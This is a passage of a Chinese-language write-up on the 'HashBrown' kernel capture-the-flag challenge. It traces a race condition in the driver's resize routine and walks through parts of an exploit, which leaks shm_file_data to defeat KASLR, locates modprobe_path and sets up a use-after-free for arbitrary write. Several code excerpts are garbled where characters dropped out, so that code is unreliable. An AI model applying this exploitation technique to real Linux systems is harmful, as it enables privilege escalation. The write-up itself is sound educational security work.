        mutex_init(&operations_lock);
        mutex_init(&resize_lock);
        hashmap.size = SIZE_ARR_START;
        hashmap.entry_count = 0;
        hashmap.threshold = GET_THRESHOLD(hashmap.size);
        hashmap.buckets = kzalloc(sizeof(hash_entry *) * hashmap.size, GFP_KERNEL);
        printk(KERN_INFO "HashBrown Loaded! Who doesn't love Hashbrowns!\n");
        return 0;
    }
除了最后几行关于hashmap的操作，其它上面的都是字符设备的普遍设置（参考驱动程序开发），看最后几行
        hashmap.size = SIZE_ARR_START;
        hashmap.entry_count = 0;
        hashmap.threshold = GET_THRESHOLD(hashmap.size);
        hashmap.buckets = kzalloc(sizeof(hash_entry *) * hashmap.size, GFP_KERNEL);
其中size是全局变量hashmap的起始size，是全局变量0x10
entry_count是计数用的 threshold就是0.75倍的size buckets存放申请的hash_entry
######  exit函数
    static void __exit exit_hashbrown(void)
    {
        device_destroy(hashbrown_class, MKDEV(major, 0));
        class_unregister(hashbrown_class);
        class_destroy(hashbrown_class);
        unregister_chrdev(major, DEVICE_NAME);
        mutex_destroy(&operations_lock);
        mutex_destroy(&resize_lock);
        printk(KERN_INFO "HashBrown Unloaded\n");
    }
没啥特殊的，就是常规的字符设备操作
######  ioctl交互函数
这个函数是用户态程序系统调用的菜单函数了
    static long hashmap_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
    {
        long result;
        request_t request;
        uint32_t idx;
        if (cmd == ADD_KEY) 
        {
            if (hashmap.entry_count == hashmap.threshold && hashmap.size > 20) ^ (key >> 12);
        hash = key ^ (key >> 7) ^ (key >> 4);
        return hash & (size - 1);
    }
通过一个hash来得到idx
关于五个功能函数就不具体分析了，本来这个题目函数就很多
五个菜单函数可以自己分析，便于理解题目，add_key delete_key update_value delete_value
get_value，这五个函数中没有漏洞，所有的包括double free、空指针引用、size导致的溢出、分配使用kzalloc导致没有泄露。
######  漏洞
漏洞出现在resize函数，主要分析下这个函数
当使用的命令是ADD_key 并且申请entry_count的数量是当前size的0.75倍，且size小于SIZE_ARR_MAX就会调用resize函数
       if (cmd == ADD_KEY) 
        {
            if (hashmap.entry_count == hashmap.threshold && hashmap.size  MAX_VALUE_SIZE)
        {
            return INVALID;
        }
之后申请新的buckets(这个是用来存放hash_entry结构体的)
        new_size = hashmap.size * 2;
        new_threshold = GET_THRESHOLD(new_size);
        new_buckets = kzalloc(sizeof(hash_entry *) * new_size, GFP_KERNEL);
之后是将原来buckets里面的hash_entry复制到新的buckets里面
        for (i = 0; i next)
                {
                    if (temp_entry->key == request.key)//
                    {
                        duplicate = 1;
                    }
                    new_idx = get_hash_idx(temp_entry->key, new_size);
                    temp = kzalloc(sizeof(hash_entry), GFP_KERNEL);
                    if (!temp) 
                    {
                        kfree(new_buckets);
                        return INVALID;
                    }
                    temp->key = temp_entry->key;
                    temp->size = temp_entry->size;
                    temp->value = temp_entry->value;
                    resize_add(new_idx, temp, new_buckets);
                }
            }
        }
如果本次调用resize的时候，用户态传递的参数key没有出现过就会add一个hash_entry加入到buckets中
        if (!duplicate)
        {
            new_idx = get_hash_idx(request.key, new_size);
            temp = kzalloc(sizeof(hash_entry), GFP_KERNEL);
            if (!temp)
            {
                kfree(new_buckets);
                return INVALID;
            }
            temp_data = kzalloc(request.size, GFP_KERNEL);
            if (!temp_data)
            {
                kfree(temp);
                kfree(new_buckets);
                return INVALID;
            }
            if (copy_from_user(temp_data, request.src, request.size))
            {
                kfree(temp_data);
                kfree(temp);
                kfree(new_buckets);
                return INVALID;
            }
            temp->size = request.size;
            temp->value = temp_data;
            temp->key = request.key;
            temp->next = NULL;
            resize_add(new_idx, temp, new_buckets);
            hashmap.entry_count++;
        }
最后清除之前的buckets，将新的buckets赋值给全局变量
        resize_clean_old();
        hashmap.size = new_size;
        hashmap.threshold = new_threshold;
        hashmap.buckets = new_buckets;
        return (duplicate)?EXISTS:0;
这里需要注意一点，虽然存在两个互斥锁，但是不影响两个互斥锁里面的具体内容分别执行，所以说可以在执行resize的同时可以执行五个菜单选项。
所以这里就存在竞争，resize和菜单都可以操作共有的堆块
然后之后的利用思路就是先用竞争泄露地址，之后用竞争实现一个任意地址写
下面通过分析exp具体介绍
## 0x04 EXP分析
刚开始的时候是获取设备fd
    fd = open("/dev/hashbrown", O_RDONLY);
之后这个循环我不是特别的理解（是chunk分配更加稳定吗？），希望有师傅可以解答，但是这个循环删除之后对于exp没有影响
        for (int i = 0; i  racer() -> race_function(leak_setup)函数
    void leak_setup()
    {
        int shmid; // shm_file_data (kmalloc-32) leak for kernel data leak to rebase kernel with fg kaslr
        char *shmaddr;
        puts("setting up for leak");
        delete_value(fd, target_idx);
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
        return;
    }
函数二
main中的
    add_key(fd, 27, sizeof(buf), (char *)race_page);
    实际上是这个触发的resize函数
上面resize函数将旧的bucket上面的chunk拷贝到新的上面的同时，函数一将第一个0x20的chunkdelete然后申请shm_file_data结构体，可以通过断点来查看
之后读出第一个chunk上面的数据（shm_file_data）,得到基地址
        get_value(fd, 0, sizeof(smallbuf), smallbuf);
        memcpy((void *)&shmem_vm_ops, (void *)&(smallbuf[0x18]), 0x8);
        kbase = shmem_vm_ops - 0x822b80;
        modprobe_path = kbase + 0xa46fe0;
        // fg-kaslr doesn't affect some of the earlier functions in .text, nor functions not in C or data, etc.
        printf("leaked shmem_vm_ops: 0x%llx\n", shmem_vm_ops);
        printf("kernel base: 0x%llx\n", kbase);
        printf("modprobe_path: 0x%llx\n", modprobe_path);
这里有一个点就是modprobe_path相对于内核基地址的偏移也是不变的
下面就是竞争实现任意地址写
之前经过resize函数size已经是之前的两倍 0x20
0x20 * 0.75 = 24
所以这次首先准备23个堆块
        for (int i = 1; i <= 22; i++)
        {
            add_key(fd, i, sizeof(buf), buf);
        }
        add_key(fd, 1337, sizeof(smallbuf), smallbuf);
其中前22个是0xb0 最后一个0x20
下面同样看两个竞争函数
一个是
    void uaf_setup()
    {
        puts("setting up uaf");
        delete_value(fd, target_idx);
    }
两一个是
    add_key(fd, 23, 0x20, (char *)0xf00d0000);
    实际是resize
可以看到这次就是将其中的一个chunk进行了删除
同时add_key申请的也是0x20，所以delete_key中value对应的chunk被分配了
所以就是
这里还通过get_value确定我们想要的chunk
        for (int i = 24; i < 0x400; i++)
        {
            add_key(fd, i, sizeof(buf), buf);
        }
        get_value(fd, target_idx, sizeof(smallbuf), smallbuf);
        uaf_entry = *(int *)smallbuf;
        printf("uaf'd entry: %d\n", uaf_entry);
        // clean up